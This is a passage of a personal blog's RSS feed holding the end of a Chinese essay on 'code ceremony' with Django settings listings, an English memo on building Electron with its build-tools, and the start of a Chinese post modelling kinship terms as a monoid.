class="hljs-string">&quot;django.contrib.contenttypes&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.contrib.sessions&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.contrib.messages&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.contrib.staticfiles&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">MIDDLEWARE = [</span><br><span class="line">    <span class="hljs-string">&quot;django.middleware.security.SecurityMiddleware&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.contrib.sessions.middleware.SessionMiddleware&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.middleware.common.CommonMiddleware&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.middleware.csrf.CsrfViewMiddleware&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.contrib.auth.middleware.AuthenticationMiddleware&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.contrib.messages.middleware.MessageMiddleware&quot;</span>,</span><br><span class="line">    <span class="hljs-string">&quot;django.middleware.clickjacking.XFrameOptionsMiddleware&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ROOT_URLCONF = <span class="hljs-string">&quot;mysite.urls&quot;</span></span><br><span class="line"></span><br><span class="line">TEMPLATES = [</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-string">&quot;BACKEND&quot;</span>: <span class="hljs-string">&quot;django.template.backends.django.DjangoTemplates&quot;</span>,</span><br><span class="line">        <span class="hljs-string">&quot;DIRS&quot;</span>: [],</span><br><span class="line">        <span class="hljs-string">&quot;APP_DIRS&quot;</span>: <span class="hljs-literal">True</span>,</span><br><span class="line">        <span class="hljs-string">&quot;OPTIONS&quot;</span>: {</span><br><span class="line">            <span class="hljs-string">&quot;context_processors&quot;</span>: [</span><br><span class="line">                <span class="hljs-string">&quot;django.template.context_processors.debug&quot;</span>,</span><br><span class="line">                <span class="hljs-string">&quot;django.template.context_processors.request&quot;</span>,</span><br><span class="line">                <span class="hljs-string">&quot;django.contrib.auth.context_processors.auth&quot;</span>,</span><br><span class="line">                <span class="hljs-string">&quot;django.contrib.messages.context_processors.messages&quot;</span>,</span><br><span class="line">            ],</span><br><span class="line">        },</span><br><span class="line">    },</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">WSGI_APPLICATION = <span class="hljs-string">&quot;mysite.wsgi.application&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Database</span></span><br><span class="line"><span class="hljs-comment"># https://docs.djangoproject.com/en/4.2/ref/settings/#databases</span></span><br><span class="line"></span><br><span class="line">DATABASES = {</span><br><span class="line">    <span class="hljs-string">&quot;default&quot;</span>: {</span><br><span class="line">        <span class="hljs-string">&quot;ENGINE&quot;</span>: <span class="hljs-string">&quot;django.db.backends.sqlite3&quot;</span>,</span><br><span class="line">        <span class="hljs-string">&quot;NAME&quot;</span>: BASE_DIR / <span class="hljs-string">&quot;db.sqlite3&quot;</span>,</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Password validation</span></span><br><span class="line"><span class="hljs-comment"># https://docs.djangoproject.com/en/4.2/ref/settings/#auth-password-validators</span></span><br><span class="line"></span><br><span class="line">AUTH_PASSWORD_VALIDATORS = [</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-string">&quot;NAME&quot;</span>: <span class="hljs-string">&quot;django.contrib.auth.password_validation.UserAttributeSimilarityValidator&quot;</span>,</span><br><span class="line">    },</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-string">&quot;NAME&quot;</span>: <span class="hljs-string">&quot;django.contrib.auth.password_validation.MinimumLengthValidator&quot;</span>,</span><br><span class="line">    },</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-string">&quot;NAME&quot;</span>: <span class="hljs-string">&quot;django.contrib.auth.password_validation.CommonPasswordValidator&quot;</span>,</span><br><span class="line">    },</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-string">&quot;NAME&quot;</span>: <span class="hljs-string">&quot;django.contrib.auth.password_validation.NumericPasswordValidator&quot;</span>,</span><br><span class="line">    },</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Internationalization</span></span><br><span class="line"><span class="hljs-comment"># https://docs.djangoproject.com/en/4.2/topics/i18n/</span></span><br><span class="line"></span><br><span class="line">LANGUAGE_CODE = <span class="hljs-string">&quot;en-us&quot;</span></span><br><span class="line"></span><br><span class="line">TIME_ZONE = <span class="hljs-string">&quot;UTC&quot;</span></span><br><span class="line"></span><br><span class="line">USE_I18N = <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">USE_TZ = <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Static files (CSS, JavaScript, Images)</span></span><br><span class="line"><span class="hljs-comment"># https://docs.djangoproject.com/en/4.2/howto/static-files/</span></span><br><span class="line"></span><br><span class="line">STATIC_URL = <span class="hljs-string">&quot;static/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Default primary key field type</span></span><br><span class="line"><span class="hljs-comment"># https://docs.djangoproject.com/en/4.2/ref/settings/#default-auto-field</span></span><br><span class="line"></span><br><span class="line">DEFAULT_AUTO_FIELD = <span class="hljs-string">&quot;django.db.models.BigAutoField&quot;</span></span><br></pre></div></div><div class="gk-code hljs" data-gk-id="django-urls" data-gk-title="urls.py"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin</span><br><span class="line"><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="hljs-string">&quot;admin/&quot;</span>, admin.site.urls),</span><br><span class="line">]</span><br></pre></div></div></div><p  class="par"> Django 提倡以模块切分业务逻辑，每个模块置于单独的目录，称为一个 app。本例中目录 <code>polls/</code> 便是一个 app，其下的各文件分别定义了所属 app 的数据模型、视图和路由等。Django 奉行所谓的 <a href="https://docs.djangoproject.com/en/4.2/faq/general/#django-appears-to-be-a-mvc-framework-but-you-call-the-controller-the-view-and-the-view-the-template-how-come-you-don-t-use-the-standard-names">MTV 模式</a>，即将数据的逻辑和展示分开，使程序更加易于维护。MTV 模式便是 Django 为可维护性引入的额外抽象，其代价是项目结构的复杂化与业务无关代码的增多。而为了更高的灵活性，Django 在 settings.py 中提供了多个配置项。用户可通过调整配置项的值，以满足业务的特定需求。此二者相合便是 Django 开发的编写仪式。</p><h3 id="运行仪式">运行仪式</h3><p ><strong>运行仪式</strong>是将所写代码执行起来所要付出的额外努力。编写仪式是代码跃于纸上的成本，运行仪式则是代码脱胎成型的代价。最常见的运行仪式莫过于“程序编译”，这也是人们通常评判运行仪式的焦点。</p><p >程序编译即将代码经由某种手段转移为目标代码。编译型语言，如 C/C++、Rust、Go 或 Java 等，其代码须经此工序方能运行。目标代码通常是机器码，但也不尽然，如 Java 是编译为 JVM 的字节码，牺牲一定的效率以换取跨平台能力。</p><p >许多人讨厌编译，害怕编译。这一方面是因为编译在代码编写和程序运行中间强插了间隙，加剧调试的延时与焦虑。但最主要的还是编译工序的繁杂与报错的晦涩。C++ 便是个典型例子。其编译的仪式源自语言的设计缺陷——模块概念的缺乏使编译工序冗繁，语法的异常复杂使编译报错晦涩难懂。编译的复杂性还可能源自业务本身的复杂性。如在 Android 开发中，你几乎不可能脱离 Android SDK 完成程序的编译——这是由交叉编译的复杂性所决定的。</p><p >程序编译曾是编译型语言的特需，但近年来，解释型语言中也出现了这种需求，其中以 Web 前端开发尤甚。Web 前端程序的运行环境有特殊性。浏览器以 HTML、CSS 以及 Javascript 三种语言的源代码作为最直接、最底层的输入，极大简化了程序的编写。但另一方面，这三种语言结构松散、抽象能力有限，同时在不同平台上标准不一，这迫使人们引入框架和工程化手段以提高大型程序的开发效率和可维护性。人们用表现力更强的“方言”（如 Typescript）编写代码，用更合理的文件结构和抽象程度更高的框架（React、Angular）组织代码，再通过工具编译成为浏览器所能执行的三种语言。这种模式在初期而饱受诟病，后因工具链的不断完善而逐渐被人们接受，直至今日成为了大多数项目的标准配置。</p><p >然而，就算是摆脱了编译梦魇的其他解释型语言，在开发过程中也会遇到其他运行仪式。Python 开发者常被依赖安装问题所困。Python 程序免除了程序编译的步骤，却只是把编译期的问题延至运行期。当程序运行时，你需要保证其所依赖的每个模块都被正确安装在正确的位置，并且有着正确的版本号。达成这点并不容易，有时它要求操作系统内要有某个老旧的库，但这个库又被其他程序所依赖，不得轻易修改（早期深度学习开发者应该深有体会）。此种依赖模式还使程序变得难以分发——因为分发对象的机器上也要有对应的依赖。依赖问题催生了 virtualenv、Anaconda 乃至 Docker 等策略的应用，但这愈发加重了 Python 运行仪式的繁杂。</p><h2 id="讨论与分析">讨论与分析</h2><p >许多代码仪式其实是迫不得已的产物。这一方面源于业务本身，另一方面源于人。</p><p >业务复杂性是代码仪式的最直接成因，决定了其复杂性的下限。如前面所述的 Android 开发必须有 Android SDK 支持，是因为生成一个可执行的 apk 文件就是有这么复杂。另一个例子是 Python 时代前的深度学习开发，人们被各种库的编译与运行时的问题折腾得不轻，是因为 CUDA 编程本身就有这么复杂。</p><p >但另一方面，我们还要考虑人的因素。大型程序编写是人分工管理的艺术。人与人的能力不同，效率不同，让项目的有效开发与可维护性成了头疼的问题。此时，框架的设计者或是项目的领导者需提高基础代码的抽象层次，以实现对项目逻辑的拆解，更高效地进行团队协作。这也是为什么大型项目或框架会需要许多样板代码或是胶水代码。重量级框架的意义是积极的，它着眼处理的是大型程序的问题。如果你觉得它们很繁琐，可能是你和它们的目标人群并不完全契合，你需要找寻更轻量级的解决方案。</p><p >让人有效协作的另一个手段是压制个性，简单来说便是让所有人都尽量写出质量差不多的代码。这可以从两方面入手。一是使用工具制定代码规范，强迫每处代码遵从一致的风格。Web 前端常用的 ESLint、Python 常用的 pylint 和 autopep8 便是为此服务的。这类工具增加了代码的仪式，但保持了代码的可维护性。另一个方案则是采用尽量简单的编程语言。Java 之所以被企业广泛采用，一部分原因是其语法足够简单，开发者无法写出个性差异巨大的代码，从而能维持项目的一致性。然而，“语法简单”与“抽象能力不足”是一体两面的。语法简单的 Java 在许多时候会显得捉襟见肘，以致需要各种设计模式补偿抽象能力的缺陷，这进而又使代码仪式复杂化了。</p><p >在考察代码仪式时，解决方案的灵活性也是个有趣的因素。前文说有着诸多配置项的重型框架会增加代码仪式，那内核紧致的轻型框架又如何呢？轻型框架收缩了责任边界，让社区去构建多种多样的插件以满足上层业务的需求，是否兼具低代码仪式与高灵活性呢？</p><p >历史上曾有多种微内核高扩展性的解决方案。Flask 是 Python 后端开发方案中的此类代表。Flask 很简洁，同时有着海量社区插件。但当人们想利用插件构建稍微复杂的程序时，却总会觉得如鲠在喉。一方面是因为插件良莠不齐，总是要斟酌许久才能选中一个特定功能的插件，而且这个插件还不能让人百分百满意。另一方面是各插件之间通常保持着绝对的独立，想在插件间做交互往往要写更多的胶水代码。人们逐渐发现，想利用在野的插件组合出任意需求是很难的，很多时候不如自己从头重写，或是使用一站式的重型框架。与此类似的还有前端的 Webpack——在其鼎盛时期，你在网上可以找到 1000 种编译 ES6 的方案，但每一种都有些小瑕疵。</p><p >人们渐渐发现选择众多并不总是一件好事。选择带来争端与标准的割裂，于高效开发是无益的。人们需要一种独断的（opinionated）、大家长式的解决方案，减少选择提高效率。这种解决方案必须瞄准领域的某个最佳实践，有且只能有一个，同时隐藏多数可选项，只提供少数或完全不提供配置项。这种模式看似违背自由竞争的意志，却能切实地减少不必要的代码仪式，提高效率。用 Python 写 Restful API 时，人们更倾向于使用 FastAPI 而不是 Flask；构建前端时，人们发现 Vite 比 Webpack 更省心。这种思潮也深刻影响了近几年开发工具的设计思路。新兴语言如 Go、Rust，其官方都会提供足够好用的包管理器、构建工具以及格式化器等，从源头掐断各种争纷，让用户专注于程序的设计。</p><h2 id="尾声">尾声</h2><p >事实上，代码仪式是一个宽泛非正式的概念。人们总是在抱怨某某代码仪式的复杂，但人们没有系统地讨论过。本文无法面面俱到地讨论各种仪式的表现、成因和应对，只是结合现实中的例子粗略地讲解了一下。愿读者能有所收获。</p><div class="footnotes"><ol><li class="footnote" id="fn:1">Domain-Specific Language (DSL) </li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Random-Thoughts/">Random Thoughts</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Methodology/">Methodology</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Programming/">Programming</category>
      
      
      <comments>https://i.hsfzxjy.site/coding-ceremory/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Building Electron From Scratch</title>
      <link>https://i.hsfzxjy.site/building-electron-memo/</link>
      <guid>https://i.hsfzxjy.site/building-electron-memo/</guid>
      <pubDate>Thu, 06 Jul 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Last night I started a journey to build &lt;a href=&quot;https://github.com/electron/electron&quot;&gt;Electron&lt;/a&gt; completely from the ground up, for i</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Last night I started a journey to build <a href="https://github.com/electron/electron">Electron</a> completely from the ground up, for investigating <a href="https://github.com/microsoft/vscode/issues/187126">a subtle issue</a> in VSCode.</p><p >The journey appears as a really painful challenge for my disk storage as well as network condition. It has downloaded around 30 GiB contents from the Internet, and occupied 55 GiB of storage space on the disk after the binary file was fully compiled. I will suggest anyone to go through this journey should place his workspace on an SSD, and adopt a network proxy of good quality if in China.</p><p >Albeit it occupies a bunch of resources greedily, the Electron team provides a command line tool <code>e</code> (<a href="https://github.com/electron/build-tools">Electron build-tools</a>) to hopefully simplify the building process. The guidance leading to this tool, however, is not obvious enough on the <a href="https://www.electronjs.org/docs/latest/development/build-instructions-gn#build-tools">doc page</a>. I’ve wasted two or three hours following the instructions in the doc that explicitly invokes <code>gclient</code> or <code>gn</code> or <code>ninja</code>, which yet resulted in a bunch of errors and a hell of mess. So here’s the first advice – <strong>DO NOT follow any instructions after section “GN files” in <a href="https://www.electronjs.org/docs/latest/development/build-instructions-gn#gn-files">this page</a>. Just go ahead to use <a href="https://github.com/electron/build-tools">Electron build-tools</a>!</strong></p><p >Things become easier once you’ve learned the existence of <a href="https://github.com/electron/build-tools">Electron build-tools</a>. To install the tool you only have to type one command</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm i -g @electron/build-tools</span></span><br></pre></div></div><p  class="par"> This package manages for you all the necessary stuffs to build Electron, including <a href="https://commondatastorage.googleapis.com/chrome-infra-docs/flat/depot_tools/docs/html/depot_tools_tutorial.html#_setting_up">Depot Tools</a> for source code management and Rust/clang toolchains for building, which are exposed as a single command <code>e</code>. To fetch the source code and build Electron in one go, you need to run</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># you&#x27;d better add this to .bashrc</span></span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> GIT_CACHE_PATH=<span class="hljs-string">&quot;/path/to/git-cache&quot;</span></span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$GIT_CACHE_PATH</span></span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># tell depot_tools not to update itself</span></span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> DEPOT_TOOLS_UPDATE=0</span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># setup network proxy if necessary</span></span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> http_proxy=... https_proxy=...</span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># go to your workspace</span></span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$WORKSPACE</span> &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-variable">$WORKSPACE</span></span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># fetch and build Electron!</span></span></span><br><span class="line"><span class="hljs-meta prompt_">$ </span><span class="language-bash">e init --root=<span class="hljs-variable">$PWD</span> --bootstrap testing --fork hsfzxjy/electron --goma none</span></span><br></pre></div></div><p  class="par"> Some notes on these command:</p><ol><li><code>depot_tools</code> respect the environment variable <code>GIT_CACHE_PATH</code> to cache up git database for all fetched dependencies. The variable is highly recommended to set as it could significantly speed up file synchronization next time.</li><li><code>depot_tools</code> will automatically check updates for itself and I don’t like it. Disable this behavior via <code>DEPOT_TOOLS_UPDATE=0</code>.</li><li><code>depot_tools</code> respect the <code>http_proxy</code> and <code>https_proxy</code> for network proxy, but <code>proxychains</code> might fail wierdly.</li><li>The flag <code>--goma none</code> is necessary if you build Electron on your personal computer without using distributed building facility like Goma. Otherwise the building process will emit errors in the middle.</li></ol>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Git/">Git</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Electron/">Electron</category>
      
      
      <comments>https://i.hsfzxjy.site/building-electron-memo/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>中式亲属称谓研究之一：构建半群</title>
      <link>https://i.hsfzxjy.site/commutable-family-names-1/</link>
      <guid>https://i.hsfzxjy.site/commutable-family-names-1/</guid>
      <pubDate>Thu, 15 Jun 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;前段时间在 V2EX 的一个帖子 &lt;a href=&quot;https://www.v2ex.com/t/943948&quot;&gt;/t/943948&lt;/a&gt; 中看到了一个有趣的问题：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p &gt;在中文的亲属称谓体系中，我们会有“爸爸的爷爷”与“爷爷的爸爸”</description>
        
      
      
      
      <content:encoded><![CDATA[<p >前段时间在 V2EX 的一个帖子 <a href="https://www.v2ex.com/t/943948">/t/943948</a> 中看到了一个有趣的问题：</p><blockquote><p >在中文的亲属称谓体系中，我们会有“爸爸的爷爷”与“爷爷的爸爸”是同一个人，即“爸爸”和“爷爷”这两个称谓是可交换的。那么是否可以找到一个准则，以归纳所有这样的可交换称谓对？</p></blockquote><p >欲解决这个问题，我们可以先使用群论对亲属关系进行建模，在此基础上分析其代数结构，进而得出亲属关系可交换的条件。本系列期用两篇博文阐述这一理论。此为其第一篇，将介绍亲属半群的建立以及该代数结构的相关性质。</p><h1 id="同长辈亲属集合-mathcalz">同/长辈亲属集合 $\mathcal{Z}$</h1><p >在开始研究亲属关系之前，我们需要明确“亲属关系”一词所指代的范围。</p><p >不同于英文语境，中文对家族中的亲属关系有着非常细致的划分。在学术上这套亲属术语被称为<a href="https://en.wikipedia.org/wiki/Sudanese_kinship">苏丹型系统</a>，需要考虑更多的可能性。本系列只关注中文语境下同辈以及长辈的亲属关系，同时采用较为宽松的等价关系，将某些差别不大的亲属关系视为同一种，以降低讨论的复杂度。</p><p >具体而言，我们定义同/长辈亲属集合 $\mathcal{Z}$。$\mathcal{Z}$ 中将包含大部分的同辈称呼，如配偶、兄弟姐妹，以及更远的姐夫、弟妹等；$\mathcal{Z}$ 中也将包含所有的长辈称呼，包括父母、爷爷奶奶，以及叔嫂婶丈等。为此，我们对 $\mathcal{Z}$ 作出如下的生成式定义：</p><ol><li>$自身 \in \mathcal{Z}$；</li><li>$n \in \mathbb{Z}^+$，$z_1, z_2, \ldots, z_n \in \{父亲，配偶，兄弟，姐妹\}$，则 $z_1 的 z_2 的\ldots 的 z_n \in \mathcal{Z}$。</li></ol><p  class="nomargin"> 其次，本文在考究两个称谓的等价性时，仅关注其在家族树上的位置，而忽略年龄的因素。这意味着：</p><ul><li>$\mathcal{Z}$ 中的元素虽然形如“什么的什么”，但如果某个日常生活中的称呼与其中一者等价，则该称呼也被视为 $\mathcal{Z}$ 中的一员。如“爷爷”也是“爸爸的爸爸”，故有 $爷爷 \in \mathcal{Z}$。</li><li>如果两个称谓的在家族树上的位置相同，仅凭年龄对立，本文将其视为集合 $\mathcal{Z}$ 中的同一个元素。例如，兄和弟、姐和妹、叔和伯在 $\mathcal{Z}$ 中皆为一个元素。</li><li>本文不着眼于某个具体的家族，而是讨论普遍意义下的亲属关系。也许在你的家族中，你的父亲没有兄弟，但在本文中，叔伯总是 $\mathcal{Z}$ 里一个合法的元素。</li><li>本文将忽略一些合乎道德的巧合。比如你的姐姐的配偶可能是你的哥哥的配偶的哥哥——这合乎道德，但是本文不认为这两个称谓是等价的。</li></ul><p  class="nomargin"> 此外，我们将如下集合 $\mathcal{Z}_*$ 称为 $\mathcal{Z}$ 的基本元集</p><p  class="par"> $$\mathcal{Z}_*=\{自身，父亲，兄弟，姐妹，配偶\}$$</p><p  class="par"> 同时为了方便起见，我们简记 $E=自身$，$F=父亲$，$B=兄弟$，$S=姐妹$ 以及 $W=配偶$。</p><h1 id="称谓结合运算-odot">称谓结合运算 $\odot$</h1><p >为了让集合 $\mathcal{Z}$ 呈现某种代数结构，我们还需引入其上的运算。一个很自然的想法便是把“的”抽象为运算，为此我们有</p><p ><strong>定义 1 (称谓结合运算)</strong>&nbsp; 设 $z_1,z_2,z_3 \in \mathcal{Z}$ 为三个亲属称谓，如果“$z_1$ 的 $z_2$”在前述的等价关系下与 $z_3$ 等价，则记 $z_3=z_1\odot z_2$。$\odot$ 被称为“称谓结合运算”。<span style="float: right">$\blacksquare$</span></p><p >为确保 $\odot$ 是定义良好的，我们必须消除某些情形下的多义性，从而 $z_1\odot z_2$ 只有至多一个结果。在现实中，如果 $z$ 为男性，则“$z$ 的兄弟的兄弟”可能是“$z$ 的兄弟”或是 $z$ 自身。本文则规定“$z$ 的兄弟的兄弟”仍是“$z$ 的兄弟”，而忽略另一义项。这种规定会影响如“亲属称谓简化”等其他问题，但不会影响这个系列所探讨的可交换性问题。相似地，我们对“姐妹”也作同样处理。</p><p >有了良定的映射 $\odot$，我们可以进一步结合 $\mathcal{Z}$ 的定义知 $\odot$ 在其上是封闭的，进而 $\odot$ 是 $\mathcal{Z}$ 上合法的二元运算。事实上，我们还有</p><p ><strong>定理 1</strong>&nbsp; 集合 $\mathcal{Z}$ 是 $\mathcal{Z}_*$ 的有限生成。<span style="float: right">$\blacksquare$</span></p><p >这也是“基本元集”起名的由来。接下来，我们可以讨论运算 $\odot$ 的一些性质。</p><h1 id="odot-的结合性与-mathcalz-半群">$\odot$ 的结合性与 $\mathcal{Z}$ 半群</h1><p >若期望在 $\mathcal{Z}$ 上进行代数演算，$\odot$ 的性质不能太差，比如至少要有结合性 $(z_1 \odot z_2) \odot z_3 = z_1 \odot (z_2 \odot z_3)$。</p><p >那么，$\odot$ 是否有符合结合律呢？由于 $\mathcal{Z}$ 是 $\mathcal{Z}_*$ 的有限生成，我们只需验证 $\odot$ 在 $\mathcal{Z}_*$ 上的结合性即可。为此，我们可以先列出五个基本元两两间的乘法表</p><p  class="nomargin"></p><table><thead><tr><th>$\odot$</th><th>E</th><th>F</th><th>W</th><th>B</th><th>S</th></tr></thead><tbody><tr><td><strong>E</strong></td><td>E</td><td>F</td><td>W</td><td>B</td><td>S</td></tr><tr><td><strong>F</strong></td><td>F</td><td>FF</td><td>FW</td><td>FB</td><td>FS</td></tr><tr><td><strong>W</strong></td><td>W</td><td>WF</td><td>E</td><td>WB</td><td>WS</td></tr><tr><td><strong>B</strong></td><td>B</td><td>F</td><td>BW</td><td>B</td><td>S</td></tr><tr><td><strong>S</strong></td><td>S</td><td>F</td><td>SW</td><td>B</td><td>S</td></tr></tbody></table><p  class="nomargin"> 借助这张乘法表，读者容易验证任意三个基本元之间 $\odot$ 运算的结合性，此处不展开阐述。于此，我们知道 $\odot$ 是 $\mathcal{Z}$ 上的一个结合性运算，从而 $\mathcal{Z}$ 在运算 $\odot$ 下构成一个半群。</p><p >除此之外，从表中我们还能发现 $E$ 是一个特殊的元。任何元素 $z \in \mathcal{Z}$ 与 $E$ （左或右）运算的结果皆为 $z$ 自身。于是，$\mathcal{Z}$ 还是一个含幺半群，其幺元为 $E$。在含幺半群中，我们可以良好地定义元素的方幂</p><p  class="nomargin"> <strong>定义 2 (方幂)</strong>&nbsp; 若 $n \in \mathbb{Z}^+, z \in \mathcal{Z}$，则定义</p><p  class="par"> $$z^n=z \odot z \odot \ldots \odot z\quad (n 个)$$</p><p  class="par"> 特别地，我们定义 $z^0=E$。<span style="float: right">$\blacksquare$</span></p><p >为了方便起见，下文会将 $z_1 \odot z_2$ 简记为 $z_1z_2$，就像我们熟悉的乘法一样。</p><h1 id="mathcalz-半群的经验性质">$\mathcal{Z}$ 半群的经验性质</h1><p >在这一节中，我将介绍 $\mathcal{Z}$ 半群的一些经验性质。这些性质派生自人们普遍认同的对亲属关系的理解，是 $\mathcal{Z}$ 的内在结构。后续定理的证明会用到这些性质。</p><p >首先，亲属关系的讨论应该是与起点无关的。如果一条关于亲属关系的断言成立，并且这条断言的起点是“自身”，那么将“自身”换成其他 $z \in \mathcal{Z}$ 也应该同样成立。这对我们后续的讨论很重要。现在让我们来考虑一条平凡的断言——“假设 $z_1$ 和 $z_2$ 是两个亲属关系，如果‘自身的 $z_1$’与‘自身的 $z_2$’等价，则 $z_1$ 与 $z_2$ 等价”。使用上述替换，我们将得到 $\mathcal{Z}$ 中一个重要的准则</p><p  class="nomargin"> <strong>性质 1 (左消去律)</strong>&nbsp; $\forall z,z_1,z_2\in\mathcal{Z}$，$zz_1=zz_2 \Longrightarrow z_1=z_2$。<span style="float: right">$\blacksquare$</span></p><p  class="nomargin"> 这有点像数域中的“在等式两边同除某个数，等式依然不变”，但在 $\mathcal{Z}$ 中，只有两项左边部分相同时才能这么做。</p><p >其次，我们可以将亲属关系中“辈分”这一概念抽象化。由于基本元集 $\mathcal{Z}_*$ 中只有 $F$ 父亲一项对辈分有贡献，一个亲属关系的辈分很自然地被定义为其中 $F$ 的数目</p><p  class="nomargin"> <strong>定义 3 (辈分数)</strong>&nbsp; 设 $z \in \mathcal{Z}$，若存在 $a_1,a_2,\ldots,a_n \in \mathcal{Z}_*$，使得 $z=a_1 a_2 \ldots a_n$，则定义以下 $G(z)$ 为 $z$ 的辈分数： $G(z) = | \{ i : a_i = F \} |$。<span style="float: right">$\blacksquare$</span></p><p  class="nomargin"> 注意到 $G(z)$ 的定义与 $a_1,a_2,\ldots,a_n$ 的具体选取无关——换言之，一个亲属关系的不同分解中 $F$ 的个数都是相同的。于是我们有</p><p  class="nomargin"> <strong>性质 2 (辈分定理)</strong>&nbsp; $a_1,\ldots,a_n,b_1,\ldots,b_m\in\mathcal{Z}_*$，若有</p><p  class="par"> $$a_1a_2\ldots a_n=b_1b_2\ldots b_m$$</p><p  class="par"> 则有 $G(a_1a_2\ldots a_n)=G(b_1b_2\ldots b_m)$。<span style="float: right">$\blacksquare$</span></p><p >除此之外，我们还可以将伦理关系纳入讨论。考虑一个同辈的基本元 $a \in \{B,S,E\}$，其配偶 $aW$ 的家族通常而言不会与我们父系的家族有关联 <sup id="fnref:1"><a href="#fn:1">1</a></sup>，故我们有</p><p  class="nomargin"> <strong>性质 3</strong>&nbsp; 若 $a \in \{B,S,E\}, b \neq W$，则关于 $x,y$ 的方程 $aWbx=Fy$ 无解。<span style="float: right">$\blacksquare$</span></p><p  class="nomargin"> 进一步地，考虑两个同辈的基本元 $a,b \in \{B,S,E\}$，如果 $a \neq b$，则他们的配偶的家族也不会有交集。故有</p><p  class="nomargin"> <strong>性质 4</strong>&nbsp; 若 $a,b \in \{B,S,E\}, c,d \neq W$，则关于 $x,y$ 的方程 $aWcx=bWdy$ 有解当且仅当 $a=b$。<span style="float: right">$\blacksquare$</span></p><p >有了以上的铺垫，我们可以进入本文最重要的主题了。</p><h1 id="mathcalz-半群的标准分解">$\mathcal{Z}$ 半群的标准分解</h1><p >想要探究一个代数结构更深层次的结构，我们需要有一种形式标准地表示出其中所有的元素。读者可以类比整数环上的质因子分解——借助质因子分解我们可以研究更多的数论性质。类似地，$\mathcal{Z}$ 中也有这样一种分解形式。不过在那之前，我们需要了解配偶分解的概念。</p><p  class="nomargin"> <strong>定义 4 (配偶分解)</strong>&nbsp; 对于 $z\in\mathcal{Z}$，若序列 $\pi=(\pi_1,\pi_2,...,\pi_n)\in\mathcal{Z}$ 满足</p><p  class="par"> $$z=\pi_1W\pi_2W\ldots W\pi_n$$</p><p  class="par">，则称 $\pi$ 为 $z$ 的一个配偶分解。$n$ 被称为配偶分解 $\pi$ 的长度，记为 $|\pi|$。$x$ 所有配偶分解的集合记为 $\Pi(x)$。<span style="float: right">$\blacksquare$</span></p><p  class="nomargin"> 配偶分解即是将一个元表示为若干以“配偶”为分隔的项。一个元可能会有许多个配偶分解，考虑到 $W$ 有特殊性质 $W^2=E$，我们可以消去其中的平凡项，仅保留长度最小的形式。为此我们定义</p><p  class="par"> <strong>定义 5 (最小配偶分解长度)</strong>&nbsp; 